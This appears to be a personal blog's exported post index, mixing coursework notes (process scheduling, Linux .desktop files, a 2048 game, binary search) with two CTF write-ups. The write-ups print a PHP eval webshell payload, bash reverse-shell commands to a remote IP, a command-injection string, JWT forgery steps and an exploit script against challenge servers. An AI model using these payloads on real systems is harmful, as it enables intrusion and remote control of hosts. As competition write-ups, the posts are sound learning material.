0\n  cpu\n  cpu\n  cpu\n  cpu\n\nProcess 1\n  io\n\na1andns@a1andns-PC:~/Documents/Course Doc/Python/Operating System$ python3 process-run.py -c -l 4:100,1:0\nTime    PID: 0    PID: 1       CPU       IOs\n  1    RUN:cpu     READY         1          \n  2    RUN:cpu     READY         1          \n  3    RUN:cpu     READY         1          \n  4    RUN:cpu     READY         1          \n  5       DONE    RUN:io         1          \n  6       DONE   WAITING                   1\n  7       DONE   WAITING                   1\n  8       DONE   WAITING                   1\n  9       DONE   WAITING                   1\n 10*      DONE      DONE         1\n\n(3)Use this statement to run the program: ./process-run.py -l 1:0,4:100a1andns@a1andns-PC:~/Documents/Course Doc/Python/Operating System$ python3 process-run.py -c -l 1:0,4:100\nTime    PID: 0    PID: 1       CPU       IOs\n  1     RUN:io     READY         1          \n  2    WAITING   RUN:cpu         1         1\n  3    WAITING   RUN:cpu         1         1\n  4    WAITING   RUN:cpu         1         1\n  5    WAITING   RUN:cpu         1         1\n  6*      DONE      DONE         1\n\nCPU run process 0 to issues an I/O request, the CPU blocks the process, then CPU run process 1 .process 1 run 4 instructions and the CPU occupancy rate of each instruction is 100%, 4 units of time later, the I/O operation and process 1 is done. Great! the process 0 and process 1 are both finished. So the total time is 6 units of time. It’s save 4 units of time than Previous way.\n(4)Use this statement to run the program: ./process-run.py -l  1:0,4:100 -c -S SWITCH_ON_END-S is a flag which decide the system’s response when current process issues an I/O. We can set this flag to SWITCH_ON_END, it means system can’t switch to another process when the I/O Operation is running.\na1andns@a1andns-PC:~/Documents/Course Doc/Python/Operating System$ python3 process-run.py -l 1:0,4:100 -c -S SWITCH_ON_END\nTime    PID: 0    PID: 1       CPU       IOs\n  1     RUN:io     READY         1          \n  2    WAITING     READY                   1\n  3    WAITING     READY                   1\n  4    WAITING     READY                   1\n  5    WAITING     READY                   1\n  6*      DONE   RUN:cpu         1          \n  7       DONE   RUN:cpu         1          \n  8       DONE   RUN:cpu         1          \n  9       DONE   RUN:cpu         1          \n\nSo we can see the CPU run the process 0 , the CPU blocks the process 0 .The process 0 run for 4 units of time until it’s finished. Next, the process 1 is running for 4 units of time. The  total time is 9 units of time.\n(5)Use this statement to run the program: ./process-run.py -l 1:0,4:100 -c -S SWITCH_ON_IOSWITCH_ON_IO means system will switch to another process when waiting I/O.\na1andns@a1andns-PC:~/Documents/Course Doc/Python/Operating System$ python3 process-run.py -l 1:0,4:100 -c -S SWITCH_ON_IO\nTime    PID: 0    PID: 1       CPU       IOs\n  1     RUN:io     READY         1          \n  2    WAITING   RUN:cpu         1         1\n  3    WAITING   RUN:cpu         1         1\n  4    WAITING   RUN:cpu         1         1\n  5    WAITING   RUN:cpu         1         1\n  6*      DONE      DONE         1\n\nWe can see the result. Firstly, CPU run the process 0 (IO), then CPU blocks the process 0. Because the IO Operation is in waiting state, the system decide to  switch to another process(process 1). And we can see the process 2 is run by CPU, it’s same as third question. Total time is 6 units of time.\n(6)Use this statement to run the program: ./process-run.py -l 2:0,5:100 -S SWITCH_ON_IO -I IO_RUN_LATER  -c -pa1andns@a1andns-PC:~/Documents/Course Doc/Python/Operating System$ python3 process-run.py -l 2:0,5:100 -S SWITCH_ON_IO -I IO_RUN_LATER  -c -p\nTime    PID: 0    PID: 1       CPU       IOs\n  1     RUN:io     READY         1          \n  2    WAITING   RUN:cpu         1         1\n  3    WAITING   RUN:cpu         1         1\n  4    WAITING   RUN:cpu         1         1\n  5    WAITING   RUN:cpu         1         1\n  6*     READY   RUN:cpu         1          \n  7     RUN:io      DONE         1          \n  8    WAITING      DONE                   1\n  9    WAITING      DONE                   1\n 10    WAITING      DONE                   1\n 11    WAITING      DONE                   1\n 12*      DONE      DONE         1\n\nStats: Total Time 12\nStats: CPU Busy 8 (66.67%)\nStats: IO Busy  8 (66.67%)\n\nThis is the same as the previous process, I don’t want to say it again. Look at the result , you will know it .\n(7)Use this statement to run the program: ./process-run.py -l 2:0,5:100 -S SWITCH_ON_IO -I IO_RUN_IMMEDIATE -c -pa1andns@a1andns-PC:~/Documents/Course Doc/Python/Operating System$ python3 process-run.py -l 2:0,5:100 -S SWITCH_ON_IO -I IO_RUN_IMMEDIATE -c -p\nTime    PID: 0    PID: 1       CPU       IOs\n  1     RUN:io     READY         1          \n  2    WAITING   RUN:cpu         1         1\n  3    WAITING   RUN:cpu         1         1\n  4    WAITING   RUN:cpu         1         1\n  5    WAITING   RUN:cpu         1         1\n  6*    RUN:io     READY         1          \n  7    WAITING   RUN:cpu         1         1\n  8    WAITING      DONE         1         1\n  9    WAITING      DONE         1         1\n 10    WAITING      DONE         1         1\n 11*      DONE      DONE         1\n\nStats: Total Time 11\nStats: CPU Busy 11 (100.00%)\nStats: IO Busy  8 (72.73%)\n\nThis is different from the previous situation, previous situation is when I/O operation is finished,CPU will keep running instructions in process 1 until it’s finished . And this one is CPU will run next I/O operation when last I/O operation is finished. So this situation just needs 11 units of time and previous situation needs 12 units of time.\nThe CPU blocks the I/O process and system decide to switch to another process . That’s a good idea! It can save more time, make the system more efficient.\n","slug":"Operating-System-Homework-1","date":"2020-09-19T06:35:04.000Z","categories_index":"操作系统","tags_index":"操作系统","author_index":"A1andNS"},{"id":"df149b563856104ed5f5e4f987c98ca6","title":"Desktop File Learning","content":"How to add a shortcuts on Linux?\nWe often download the software from the software’s official website . But sometimes the software is a zip which include the binary file of the software. For example, I download a Firefox browser form its official website, but I can’t get a .deb file. So I don’t need it and can’t install it, so how can I add a shortcuts to launcher.\n\n\n\n\n\n\n\n\n\nDesktop Entry file is used to describe the startup configuration information of the program in the Linux desktop system.\nso many Linux release support the launcher which is used to manage the program centrally. The launcher on my machine is located in the /usr/share/applications directory. We can see so many .desktop file in there. Every .desktop file in there is a program entry and you can set a logo of shortcuts. That’s so friendly.\n\nDesktop file example[Desktop Entry]\nName&#x3D;&lt;application name&gt;\nType&#x3D;Application\nExec&#x3D;&lt;appliction full path&gt;\nIcon&#x3D;&lt;appliction logo full path&gt;\n\nIt’s a easy example.\n\nName: It’s the name which the file display finally\nType: it’s used to set the type of the desktop file\nExec: it’s full path of the binary exec file\nIcon: it’s full path of the logo, the best size is 128x128\n\nOf course, You can add a element called Categories. it’s useful if you want to classify.\nNow let’s have a try.\n[Desktop Entry]\nName&#x3D;Firefox\nType&#x3D;Application\nExec&#x3D;&#x2F;home&#x2F;a1andns&#x2F;Software&#x2F;firefox&#x2F;firefox\nIcon&#x3D;&#x2F;home&#x2F;a1andns&#x2F;Software&#x2F;firefox&#x2F;browser&#x2F;chrome&#x2F;icons&#x2F;default&#x2F;default128.png\nCategories&#x3D;Network\n\nI get a great shortcut. Now I will move it to the launcher.\n\na1andns@a1andns-PC:~/Software/firefox$ sudo mv firefox.desktop /usr/share/applications\n\nNice !!!\nWe can see it in launcher’s network category.\n\nThis is my first English Blog, that’s look just so so .\n","slug":"Desktop File Learning","date":"2020-09-18T14:04:39.000Z","categories_index":"资源教程","tags_index":"Linux","author_index":"A1andNS"},{"id":"993573f867cfcdcc59590e5a4fe361bb","title":"羊城杯CTF(部分，包含复现)","content":"昨天有些事，就摸了三题，两题web一题杂项。其他全都靠同队大佬了。\n\n0x01 easyphp这题很直接给出来源代码：\n其中有一个file_put_contents()函数，可以写入内容要指定文件里。\npayload: \n?content&#x3D;&lt;?php eval($_POST[%27123%27])?&gt;&amp;filename&#x3D;index.php\n\n\n然后我用antsword连上了index.php\n\n然后在/目录下找到flag文件，读取他得到了\n\nGWHT{easyApache}\n这题还有一种解法，那就是向目录写入一个.htaccess文件，来读flag文件。\n0x02 com这是一题杂项题\n首先nc上去，给出来一个35元方程组，那么就要解这个方程组了。解出方程组后，就要按照要求构造list了。这里有个坑点啊，list里的,必须是中文的，\n这里搞的试了好久都没有成功。\ncert:\n[584, 489, 423, 13, 1003, 796, 178, 429, 866, 419, 883, 856, 832, 1020, 478, 356, 293, 750, 562, 699, 427, 643, 760, 184, 821, 876, 655, 240, 487, 510, 279, 476, 672, 324, 59]\n\n提交cert，就会得到flag：\n\n得到了flag。\n0x03 easycon目录扫描后，访问了index.php文件，提示eval post cmd，从中可以得知cmd可能是一个shell的密码。\n使用antsword去连接。\n\n下载bbbbbbbbb.txt文件到本地\n\n感觉可能是base64了，所以我base64先解一下,然后binwalk分析，得知是图片，修改后缀为png\n\n就会得到flag\n下面利用赛后的复现环境复现一下其他的赛题0x04 blackcat看了一圈没有发现什么东西，只有注释里提示要听歌。那我就把音乐下载到本地看看有什么玄机。\n查看16进制的mp3文件发现在尾部有php代码\n\n提取出来审计代码\nif(empty($_POST['Black-Cat-Sheriff']) || empty($_POST['One-ear']))&#123;\n    die('˭�����Ҳ���һֻ����β�ͣ�');\n&#125;\n\n$clandestine = getenv(\"clandestine\");\n\nif(isset($_POST['White-cat-monitor']))\n    $clandestine = hash_hmac('sha256', $_POST['White-cat-monitor'], $clandestine);\n\n\n$hh = hash_hmac('sha256', $_POST['One-ear'], $clandestine);\n\nif($hh !== $_POST['Black-Cat-Sheriff'])&#123;\n    die('������׼�����������������������Ҫ��׼��Ŀ�ꡣ�����Լ���������ǿ����а��ĵ��ӵ���');\n&#125;\n\necho exec(\"nc\".$_POST['One-ear']);\n\n\n利用的是hash_hmac处理数组会返回false的特点：hmac(‘sha256’,array(),$clandstine) ==false\n这样$hh=hash_hmac(‘sha256’,$_POST[‘One-ear’],false)\n然后执行one-ear参数来执行命令，可以做到反弹shell\nBlack-Cat-Sheriff&#x3D;f9ecf877d7aeca395660b29214723583d72856b3d6ceee62c052e29b1873654c&amp;One-ear&#x3D;-lvp\n8888;bash -c &#39;bash -i &gt;%26 &#x2F;dev&#x2F;tcp&#x2F;xx.xx.xx.xx&#x2F;8888 0&gt;%261&#39;&amp;White-cat-monitor[]&#x3D;\n\n\n0x05 easyphp2cookie传入pass=GWHT\nfile参数可以包含文件\nphp://filter/read=convert.%25%36%32ase64-encode/resource=GWHT.php\n\n拿到GWHT.php源码\n&lt;!DOCTYPE html&gt;\n&lt;html lang&#x3D;&quot;en&quot;&gt;\n\n&lt;head&gt;\n    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;\n    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;\n    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;ie&#x3D;edge&quot;&gt;\n    &lt;title&gt;count is here&lt;&#x2F;title&gt;\n\n    &lt;style&gt;\n\n        html,\n        body &#123;\n            overflow: none;\n            max-height: 100vh;\n        &#125;\n\n    &lt;&#x2F;style&gt;\n&lt;&#x2F;head&gt;\n\n&lt;body style&#x3D;&quot;height: 100vh; text-align: center; background-color: green; color: blue; display: flex; flex-direction: column; justify-content: center;&quot;&gt;\n\n&lt;center&gt;&lt;img src&#x3D;&quot;question.jpg&quot; height&#x3D;&quot;200&quot; width&#x3D;&quot;200&quot; &#x2F;&gt; &lt;&#x2F;center&gt;\n\n    &lt;?php\n    ini_set(&#39;max_execution_time&#39;, 5);\n\n    if ($_COOKIE[&#39;pass&#39;] !&#x3D;&#x3D; getenv(&#39;PASS&#39;)) &#123;\n        setcookie(&#39;pass&#39;, &#39;PASS&#39;);\n        die(&#39;&lt;h2&gt;&#39;.&#39;&lt;hacker&gt;&#39;.&#39;&lt;h2&gt;&#39;.&#39;&lt;br&gt;&#39;.&#39;&lt;h1&gt;&#39;.&#39;404&#39;.&#39;&lt;h1&gt;&#39;.&#39;&lt;br&gt;&#39;.&#39;Sorry, only people from GWHT are allowed to access this website.&#39;.&#39;23333&#39;);\n    &#125;\n    ?&gt;\n\n    &lt;h1&gt;A Counter is here, but it has someting wrong&lt;&#x2F;h1&gt;\n\n    &lt;form&gt;\n        &lt;input type&#x3D;&quot;hidden&quot; value&#x3D;&quot;GWHT.php&quot; name&#x3D;&quot;file&quot;&gt;\n        &lt;textarea style&#x3D;&quot;border-radius: 1rem;&quot; type&#x3D;&quot;text&quot; name&#x3D;&quot;count&quot; rows&#x3D;10 cols&#x3D;50&gt;&lt;&#x2F;textarea&gt;&lt;br &#x2F;&gt;\n        &lt;input type&#x3D;&quot;submit&quot;&gt;\n    &lt;&#x2F;form&gt;\n\n    &lt;?php\n    if (isset($_GET[&quot;count&quot;])) &#123;\n        $count &#x3D; $_GET[&quot;count&quot;];\n        if(preg_match(&#39;&#x2F;;|base64|rot13|base32|base16|&lt;\\?php|#&#x2F;i&#39;, $count))&#123;\n        \tdie(&#39;hacker!&#39;);\n        &#125;\n        echo &quot;&lt;h2&gt;The Count is: &quot; . exec(&#39;printf \\&#39;&#39; . $count . &#39;\\&#39; | wc -c&#39;) . &quot;&lt;&#x2F;h2&gt;&quot;;\n    &#125;\n    ?&gt;\n\n&lt;&#x2F;body&gt;\n\n&lt;&#x2F;html&gt;\n\n关键在exec()函数，他会执行命令。\ncount&#x3D;1&#39;+|+bash+-i+&gt;%26+&#x2F;dev&#x2F;tcp&#x2F;8.129.44.234&#x2F;8887+0&gt;%261&quot;+||+echo+&#39;\n\ngetshell然后就可以去读flag文件了，flag在/GWHT/system/of/a/down/flag.txt\n但是要权限才能读，/GWHT/README里面提示密码hash\n解密得到密码为GWHTCTF，对应的用户GWHT，最后获取flag\n","slug":"羊城杯CTF-部分","date":"2020-09-11T01:19:52.000Z","categories_index":"CTF","tags_index":"CTF,WEB,Misc,羊城杯","author_index":"A1andNS"},{"id":"6a4d9e181c2406d317b06b634d8dec47","title":"Python写个2048","content":"项目名称-2048小游戏用户行为所有的有效输入都可以转换为上下左右，游戏重置，退出这六种行为，有效输入键是WASDRQwasdrq，并且要把行为和输入关联起来。\nactions = ['Up', 'Left', 'Down', 'Right', 'Restart', 'Exit']\n#键位字母ascii码化\nletter_codes = [ord(ch) for ch in 'WASDRQwasdrq']\n#建立映射，用到字典类型，循环两次actions，毕竟要做到不区分大小写字母\nactions_dict = dict(zip(letter_codes, actions * 2))\n\n状态机处理游戏的主逻辑的时候我们会用到一种十分常用的技术：状态机，或者更准确的说是有限状态机(FSM)\n\n游戏初始化函数init()首先要有一个init()函数用来初始化我们的游戏棋盘，使游戏变成初始状态。\n游戏结束函数not_game()not_game函数用来表示游戏结束时的状态，因为会有两个状态，一个是win，一个是gameover。在显示这两个结果的时候还要提供restart和exit功能。\ndef not_game(state):\n     '''展示游戏结束界面。\n     读取用户输入得到 action，判断是重启游戏还是结束游戏\n     '''\n     # defaultdict 参数是 callable 类型，所以需要传一个函数\n     responses = defaultdict(lambda: state)\n     # 在字典中新建两个键值对\n     responses['Restart'], responses['Exit'] = 'Init', 'Exit'\n     return responses[action]\n\n这里 defaultdict 作用是生成一个特殊的字典 responses。 在普通的字典里，我们都知道如果使用字典里不存在的 key 来取 value，程序就会报错。但在 defaultdict 生成的特殊字典里，如果要取的 key 不存在，程序不仅不会报错，还能取到一个我们设定的默认 value 值。也就是说，在 responses 这个特殊字典里，responses[action] 在 action 为 &#39;Restart&#39; 、&#39;Exit&#39; 这两种行为时分别对应 &#39;Init&#39; 和 &#39;Exit&#39; 状态。在 keyaction 为 actions = [&#39;Up&#39;, &#39;Left&#39;, &#39;Down&#39;, &#39;Right&#39;, &#39;Restart&#39;, &#39;Exit&#39;] 中的其他行为时，对应的都是默认的 valuestate。\n这样一来，在游戏结束界面，玩家输入 r 和 q 以外的键位都不能对游戏界面造成影响。\n游戏进行函数game()def game():\n     # 画出当前棋盘状态\n     # 读取用户输入得到 action\n     if action == 'Restart':\n         return 'Init'\n     if action == 'Exit':\n         return 'Exit'\n     # if 成功移动了一步:\n         if 游戏胜利了:\n             return 'Win'\n         if 游戏失败了:\n             return 'Gameover'\n     return 'Game'\n\n逻辑很简单，如果中途Restart就回到Init state，如果中途Exit就跳转到Exit状态游戏结束。如果游戏胜利就跳转到Win state，同事Win state是触发了not_game(Win)。同理Gameover状态也就会出发notgame(gameover)。\n状态机的机制很像操作系统中xv6的proc结构中的process设置状态，然后实现状态转换。不同的是一个操作对象是process，一个是游戏场景。\ngame()表示的是游戏的运行状态，在不重新开始或退出游戏的情况下，只要游戏没有胜利或失败，就会一直处于游戏状态。\nUser输入处理user输入是程序人机交互的重要环节，上面的代码也是根据用户输入来进行判断的。我们引入了键位和关键词映射的方法，把几种操作映射到awsdqeAWSDQE这几个键位上。\ndef get_user_action(keyboard):\n    ch = \"N\"\n    while ch not in action_dict:\n        #返回按下键位的ASCII码值\n        char = keyboard.getch()\n    return actions_dict[char]\n\n阻塞+循环，知道获取到有效输入。\n棋盘创建class GameField(object):\n    def __init__(self, height = 4, width = 4, win = 2048):\n        self.height = height\n        self.width = width\n        self.win_value = 2048\t#胜利分数\n        self.score = 0\t#当前分数\n        self.highscore = 0 \t#最高分数\n        self.reset()\t#重置棋盘\n\n初始化棋盘的参数，可以指定棋盘的高度和宽度以及游戏胜利的条件。这里我是指定了一个4X4,胜利条件为2048分的棋盘。\n棋盘操作根据2048的游戏规则，我需要随机生成一个2或4,这里要用到random库，这是一个python的随机数生成库，用到了里面的randrange方法和choice方法。\n\n\n\n\n\n\n\n\n\nrandrange(x)方法：从x中去一个随机数\nchoice()方法：从一个非空的序列(list、str、tuple等)中随机返回一个元素。\n用二维数组来表示i,j坐标，但是为了方便可以把array作为list的element来存储，这样施一公choice方法选择list中的一个element就会还是一个array type，这个时候把他再赋给array就会简单很多。\n重置棋盘def reset(self):\n    if self.score > self.highscore:\n        self.highscore = self.score\n    self.score = 0\n    self.field = [[0 for i in range(self.width)]for j in range(self.height)]\n    self.spawn()\n    self.spawn()\n\n先把所有的元素复原为0 ，然后再在随机位置生成游戏初始数值。\n判断输赢def is_win(self):\n    return any(any(i>=self.win_value for i in row) for row in self.field)\ndef is_gameover(self):\n    return not any(selfd.move_is_possible(move) for move in actions)\n\nany函数是python内置函数，any用于接受一个可迭代对象作为参数，返回bool值。\n这里的any里面嵌套了另一个any，里层any传入每一行的元素并依次比较这一行的每个元素与self.win_value的大小，如果有任何一个元素大于self.win_value，就返回True，否则返回False。外层any传入的是矩阵每一行元素在内层any处理后返回的bool值。\ncurses库：curses.wrapper函数会激活并初始化终端进入curses模式。这个模式下会禁止输入的字符显示在终端上、禁止终端程序的行缓冲，也就是字符在输入是实时可用，不需要回车或者换行，这就是游戏的体验了。\n项目源代码：# -*- coding: utf-8 -*-\nimport curses\nfrom random import randrange, choice\nfrom collections import defaultdict\nfrom typing import List\n\nletter_code = []\nfor ch in 'WASDRQwasdrq':\n    letter_code.append(ord(ch))  # return the ascii value of the button we push\n# print(letter_code)\naction = ['Up', 'Left', 'Down', 'Right', 'Restart', 'Exit']\naction_dict = dict(zip(letter_code, action * 2))\n\n\n# print(action_dict)\n\ndef get_user_action(keyboard):\n    char = 'N'\n    while char not in action_dict:\n        # if char in action_dict, we should get the char from keyboard until char is right\n        char = keyboard.getch()\n    return action_dict[char]\n\n\ndef transpose(field):\n    ls = []\n    for row in zip(*field):\n        ls.append(list(row))\n    return ls\n\n\ndef invert(field):\n    ls = []\n    for row in field:\n        ls.append(row[::-1])\n    return ls\n\n\nclass GameField(object):\n    def __init__(self, height=4, width=4, win=2048):\n        self.height = height\n        self.width = width\n        self.win_value = win\n        self.score = 0\n        self.highscore = 0\n        self.reset()\n\n    def reset(self):\n        if self.score > self.highscore:\n            self.highscore = self.score\n        self.score = 0\n        self.field = []\n        ls = []\n        for i in range(self.width):\n            ls.append(0)\n        for i in range(self.height):\n            self.field.append(ls)\n        self.spawn()\n        self.spawn()\n\n    def move(self, direction):\n        def move_row_left(row):\n            def tighten(row):    # squeeze non-zore elements\n                new_row = []\n                ls = []\n                for i in row:\n                    if i != 0:\n                        new_row.append(i)\n                for i in range(len(row) - len(new_row)):\n                    ls.append(0)\n                new_row += ls\n                return new_row\n\n            def merge(row):\n                pair = False\n                new_row = []\n                for i in range(len(row)):\n                    if pair:\n                        new_row.append(2*row[i])\n                        self.score += 2*row[i]\n                        pair = False\n                    else:\n                        if i + 1 &lt; len(row) and row[i] == row[i+1]:\n                            pair = True\n                            new_row.append(0)\n                        else:\n                            new_row.append(row[i])\n                assert len(new_row) == len(row)\n                return new_row\n            return tighten(merge(tighten(row)))\n        moves = &#123;&#125;\n        moves['Left'] = lambda field: [move_row_left(row) for row in field]\n        moves['Right'] = lambda field: invert(moves['Left'](invert(field)))\n        moves['Up'] = lambda field: transpose(moves['Left'](transpose(field)))\n        moves['Down'] = lambda field: transpose(moves['Right'](transpose(field)))\n\n        if direction in moves:\n            if self.move_is_possible(direction):\n                self.field = moves[direction](self.field)\n                self.spawn()\n                return True\n            else:\n                return False\n\n    def is_win(self):\n        return any(any(i>=self.win_value for i in row)for row in self.field)\n\n    def is_gameover(self):\n        return not any(self.move_is_possible(move) for move in action)\n\n    def draw(self, screen):\n        help_string1 = \"(W)Up (S)Down (A)Left (D)Right\"\n        help_string2 = \"    (R)Restart (Q)Exit\"\n        gameover_sting = \"          GAME OVER!!!\"\n        win_sting = \"    CONGRATUATION!!YOU WIN!!!\"\n\n        def cast(string):\n            screen.addstr(string+\"\\n\")\n\n        def draw_hor_separator():\n            line = '+' + (\"+------\" * self.width + \"+\")[1:]\n            separator = defaultdict(lambda: line)\n            if not hasattr(draw_hor_separator, \"counter\"):\n                draw_hor_separator.counter = 0\n            cast(separator[draw_hor_separator.counter])\n            draw_hor_separator.counter += 1\n\n        def draw_row(row):\n            cast(''.join('|&#123;: ^5&#125; '.format(num) if num > 0 else '|      ' for num in row) + '|')\n\n        screen.clear()\n        cast('SCORE:' + str(self.score))\n        if 0 != self.highscore:\n            cast(\"HIGHSCORE:\" + str(self.highscore))\n        for row in self.field:\n            draw_hor_separator()\n            draw_row(row)\n        draw_hor_separator()\n        if self.is_win():\n            cast(win_sting)\n        else:\n            if self.is_gameover():\n                cast(gameover_sting)\n            else:\n                cast(help_string1)\n        cast(help_string2)\n\n    def spawn(self):\n        new_element = 4 if randrange(100) > 89 else 2\n        (i,j) = choice([(i,j) for i in range(self.width) for j in range(self.height) if self.field[i][j] == 0])\n        self.field[i][j] = new_element\n\n    def move_is_possible(self, direction):\n        def row_is_left_movable(row):\n            def change(i):\n                if row[i] == 0 and row[i+1] != 0:\n                    return True\n                if row[i]!= 0 and row[i+1] == row[i]:\n                    return False\n            return any(change(i) for i in range(len(row)-1))\n\n        check = &#123;&#125;\n        check['Left'] = lambda field: any(row_is_left_movable(row) for row in field)\n        check['Right'] = lambda field: check['Left'](invert(field))\n        check['Up'] = lambda field: check['Left'](transpose(field))\n        check['Down'] = lambda field: check['Right'](transpose(field))\n\n        if direction in check:\n            return check[direction](self.field)\n        else:\n            return False\n\ndef main(stdscr):\n    def init():\n        game_field.reset()\n        return 'Game'\n\n    def not_game(state):\n        game_field.draw(stdscr)\n        action = get_user_action(stdscr)\n        response = defaultdict(lambda: state)\n        response['Restart'], response['Exit'] = 'Init', 'Exit'\n        return response[action]\n\n    def game():\n        game_field.draw(stdscr)\n        action = get_user_action(stdscr)\n\n        if action == 'Restart':\n            return 'Init'\n        if action == 'Exit':\n            return 'Exit'\n        if game_field.move(action):\n            if game_field.is_win():\n                return 'Win'\n            if game_field.is_gameover():\n                return 'Gameover'\n        return 'Game'\n\n    state_action = &#123;\n        'Init': init,\n        'Win': lambda: not_game('Win'),\n        'Gameover': lambda: not_game('Gameover'),\n        'Game': game\n    &#125;\n\n    curses.use_default_colors()\n\n    game_field = GameField(win=32)\n    state = 'Init'\n    while state != 'Exit':\n        state = state_action[state]()\n\ncurses.wrapper(main)\n\n这里写的都是普通写法的for结合append来添加list element。其实可以还用list解析的写法会更加快速。\nls = [0[for i in range(5)] for j in range(5)]\n\n参考材料[1]. 蓝桥课程：https://www.lanqiao.cn/courses/368\n","slug":"Python写个2048","date":"2020-09-09T13:48:50.000Z","categories_index":"Python,学习笔记","tags_index":"Python,2048,学习笔记","author_index":"A1andNS"},{"id":"d843ced03f40ac612213952de4b63ad2","title":"二分查找","content":"之前学习了一下二分查找，然后根据算法的描述和效果。写了一下实现代码，一个使用C++写的，一个使用Python3写的。\nC++实现如下：\n#include &lt;iostream&gt;\nusing namespace std;\n\nvoid banary_search(int data_array[],int item, int len )\n&#123;\n    int low &#x3D; 0;\n    int high &#x3D; len;\n    while(low&lt;&#x3D;high)&#123;\n        int mid &#x3D; (low+high) &#x2F; 2;\n        int guess &#x3D; data_array[mid];\n        if (guess &#x3D;&#x3D; item)\n        &#123;\n            cout&lt;&lt;&quot;item has been found at &quot;&lt;&lt;mid&lt;&lt;&quot;th index&quot;&lt;&lt;endl;\n            return ;\n        &#125;\n        else if (guess &gt; item)\n        &#123;\n            high &#x3D; mid - 1;\n        &#125;\n        else\n        &#123;\n            low &#x3D; mid + 1;\n        &#125;\n    &#125;\n    cout&lt;&lt;&quot;item not found&quot;&lt;&lt;endl;\n    return ;\n&#125;\nk\nint main()\n&#123;\n    int data_array[] &#x3D; &#123;1,2,3,4,55,66,77,88,98,99&#125;;\n    int lenth &#x3D; sizeof(data_array) &#x2F; sizeof(int);\n    banary_search(data_array, 55, lenth);\n    banary_search(data_array, 2, lenth);\n    banary_search(data_array, 99, lenth);\n    return 0;\n&#125;\n\nPython3实现：\n\n\n\n\n\n\n\n\n\npython写的时候我是去读取字典文件的数值来组成list，然后再从键盘接受一个查找值，进行查找。\ndef binary_search(list , item):\n    low = 0\n    high = len(list)-1\n    while low &lt;= high:\n        mid = (low+high) // 2\n        guess = list[mid]\n        if(guess == item):\n            return mid\n        if(guess > item):\n            high = mid-1\n        else:\n            low = mid+1\n\n    return None\n\ndef readInput():\n    num = input(\"please enter the number you want to find: \")\n    return num\n\ndef readFileNum(path):\n    txt = open(path,\"r\",encoding=\"UTF-8\")\n    alist = []\n    for line in txt:\n        line = line.replace(\"\\n\",\"\")\n        alist.append(line)\n    return alist\n\ndef readFilePath():\n    path = input(\"please enter the path of the FILE： \")\n    return path\n\npath = readFilePath()\ntest_list = readFileNum(path)\nnum = readInput()\n'''for i in test_list:\n    print(i)\n'''\nprint(\"find the index of the number is \" + str(binary_search(test_list,num)))\n\n二分查找相比普通的遍历查找拥有优势，二分查找最多只需要log(n)次就可以了，普通遍历查找则最多需要n次\n","slug":"二分查找","date":"2020-09-09T09:47:15.000Z","categories_index":"学习笔记","tags_index":"Python,学习笔记,数据结构,C++","author_index":"A1andNS"},{"id":"638e377c432480dc1f252e376e8aa3f0","title":"DDCTF复现","content":"0x01 一起拼图吗？download文件到本地上，打开后发现有6400张图片。但是图片中混淆这带有flag的图片，我们要做的就是把他们找出来。\n没有脚本手找。\n\nDDCTF{484e61cd1483c34de48eb7b3c933a22}\n0x02 web签到题\n\n\n\n\n\n\n\n\n题目描述：请从服务端获取client，利用client获取flag\n打开http://117.51.136.197/hint/1.txt\n\n看这个流程是要POST提交一个username和pwd的表单,直接先来试一个。\n\n去验证一下auth，显示需要admin\n\n这里是JWT，可以到网站https://jwt.io/ 解密该码\n\n\n\n\n\n\n\n\n\nJWT是由三段信息构成的，将这三段信息文本用.链接一起就构成了Jwt字符串。\n\n可以看到payload为：\n&#123;\n  \"userName\": \"admin\",\n  \"pwd\": \"123\",\n  \"userRole\": \"GUEST\",\n  \"exp\": 1599561554\n&#125;\n\n尝试爆破，这里用了这个工具https://github.com/brendan-rius/c-jwt-cracker\n\nkey值为2。\n在jwt.io网站修改”userRole”:”ADMIN”，生成伪装token\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6ImFkbWluIiwicHdkIjoiMSIsInVzZXJSb2xlIjoiQURNSU4iLCJleHAiOjE1OTk1NjU4NTF9.HjZa77naF2yoaNROHolMZpkRXY9sR-50wrkYnj6vVf8\n\n下载client：http://117.51.136.197/B5Itb8dFDaSFWZZo/client\n按理说这是一个可执行文件，chmod +x client添加一下运行权限，然后运行\n\n可以看到它在向server/command发送sign和command以及time-stamp,似乎在执行命令，并且直接给出flag路径为/home/dc2-user/flag/flag.txt，需要知道sign的生成规则，于是需要简单逆向。\n可以得知是使用啦sha-256加密\n#exp\nimport hmac\nimport base64\nimport time\nimport requests\nimport json\nfrom hashlib import sha256\ncmd = \"new java.io.BufferedReader(new java.io.FileReader('/houser/flag/flag.txt')).readLine()\"\nkey = \"DDCTFWithYou\"\ndata = \"%s|%d\"%(cmd,int(time.time()))\nsignature = base64.b64encode(hmac.new(key, data, digestmod=sha256).digest())\nprint signature\nurl = \"http://117.51.136.197/server/command\"\ndata = &#123;\n    \"signature\":signature,\n    \"command\":cmd,\n    \"timestamp\":int(time.time())\n    &#125;\ndata = json.dumps(data)\nprint data\nheaders = &#123;\"Content-Type\":\"application/json\"&#125;\nr = requests.post(url,data=data,headers=headers)\nprint r.text \n\n\nDDCTF{Q24uf486whGOWN44UtZCjYUgdnnnRaVs}\n0x03 卡片商店本题的基本逻辑为\n\n\n\n\n\n\n\n\n\n借卡　/loans?loans=1\n把卡借给朋友　/send?sends=1\n刷新卡片　/banlance\n兑换礼物 /gift\n重新开始　/reset\n要兑换礼物就需要100张卡片，但是如果直接借入100张，需要还回去102张卡，并且有一个换礼物的限制，必须要在还完卡后才能兑换礼物。\n\n这种类型的题目，可能实在考察最大整形溢出，于是尝试直接借9223372036854775807张卡片，这里的最大整数为２**63-1\n,我们借了2**63-1 张卡片，然后我们就需要还回去２**63+1张卡片，而溢出后，实际只要还一张卡片了。\n\n然后还回去一张卡片，就可以去兑换礼物了。\n\n得到了flag路由和seckey\nurl: &#x2F;flag , SecKey: 